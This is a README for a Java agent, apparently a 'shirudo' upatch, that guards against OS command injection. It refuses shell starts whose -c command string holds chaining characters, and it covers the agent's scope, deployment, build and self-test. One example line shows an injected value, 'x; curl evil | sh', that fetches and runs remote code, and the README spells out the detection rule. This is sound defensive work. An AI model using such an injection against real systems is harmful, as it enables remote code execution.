# java-exec

The `java-exec` package installs the `java-exec` Java upatch: an agent
that refuses the usual shape of an OS command injection in Java code, a
shell started with a command string that text from a request was pasted
into:

```java
Runtime.getRuntime().exec(new String[] { "sh", "-c", "ping -c1 " + host });  // host = "x; curl evil | sh"
```

The guard is a check at the start of the private
`ProcessBuilder.start(ProcessBuilder.Redirect[])`, which `start()`,
`startPipeline` and every `Runtime.exec` overload reach. On release 8,
which has no such method, it is `start()` itself. A refused start throws
`java.io.IOException`, which every caller of `start` and `exec` already
handles, before any process is created. The message and the log line
name the shell and what the command string does, never the command
string, which is the attacker's text:

```
java-exec guard refused a shell command that chains commands: sh -c
```

The check is written with Byte Buddy, relocated inside the agent jar so
it cannot clash with an application's own. Byte Buddy inlines it into
`ProcessBuilder`, and it uses `java.base` classes alone, so the agent
adds nothing to the bootstrap loader.

## What it refuses and what it does not

It refuses a start when all of these hold:

- the program's base name is `sh`, `bash`, `dash`, `zsh`, `ksh` or
  `ash`, with or without a directory, such as `/bin/sh`;
- an option cluster before the first operand holds `-c`, as `-c`, `-lc`
  or `-e -c` do, so the first operand is a command string;
- that command string holds a character that chains or substitutes
  commands: `;` or a newline, `|` or `&` (and so `||` and `&&`), or a
  backquote or `$(`. An `&` of a redirection, as in `2>&1`, `<&3` or
  `&>file`, does not count.

Everything else starts as before:

- A program that is not a shell, such as `exec("ping", host)`: no shell
  reads its arguments, so there is nothing to inject into. Argument
  injection into such a program is out of scope.
- A shell running a script file, or `-c` with a command string that has
  none of the characters above, such as `sh -c "echo ok"`.
- The operands after the command string, the shell's positional
  parameters: `sh -c 'ping -c1 "$1"' sh "$host"` is the safe way to pass
  a shell data, and the guard lets it through whatever `$host` holds.
- A shell named otherwise, `busybox sh`, `fish` or `csh` among them.

An application that runs `sh -c "a | b"` or `bash -c "x && y"` on
purpose is refused as well. Do not load the upatch on a host that runs
one. `app-sandbox`'s `exec` policy, which the kernel enforces and root
in the JVM cannot step around, is the stronger boundary; this guard
works one level up, refuses only the injected shape, and lets an
application that runs helpers keep working without an exec allow list.
Escaping or not building shell commands from input is the durable fix;
this is a mitigation in front of it.

## Which JVMs it reaches

The agent is built for release 8, so it loads on a JVM of release 8 or
newer. A premain that cannot install the guard prints
`java-exec guard not installed: ...` and returns, so the JVM starts
without the guard rather than not at all.

The agent reaches a JVM two ways:

- As a shirudo Java upatch it is applied with `-javaagent` at JVM start,
  through the `JAVA_TOOL_OPTIONS` that
  `/run/environment.d/shirudo.conf` sets (see
  `Documentation/upatches/write/java-agents.rst`). It reaches only JVMs
  that a systemd user manager starts after the upatch is loaded; root
  can start a JVM without it. It is a mitigation inside the application,
  not a boundary against root.
- For a JVM that shirudo does not start, such as one in a container,
  the same jar attaches to a running process:
  `java -jar java-exec.jar <pid>`.

## Build

The build needs Maven and a JDK of release 9 or newer on `PATH`, and
fetches Byte Buddy on first use:

```sh
upatches/java-exec/build.sh 0.1.0 --keys-dir <keys>
```

It writes `java-exec-0.1.0.bee` into the current directory.

## Check that the guard is in a JVM

`upatches/test/build.sh` builds `upatches/test/execShell.jar`, which
starts shell commands with each refused character through
`Runtime.exec(String)`, `Runtime.exec(String[])`, `ProcessBuilder.start`
and `startPipeline`, and commands the guard must pass: `sh -c` without
such a character or with only a `2>&1` redirection, a program that is not a shell, a script file, data in
a positional parameter and `bash -o pipefail -c`. The refused commands
only echo. It exits with 0 when the guard refused every injected shape
and passed the rest, and with 1 in a JVM without it, where the shell
runs them:

```sh
upatches/test/build.sh
java -jar upatches/test/execShell.jar
```
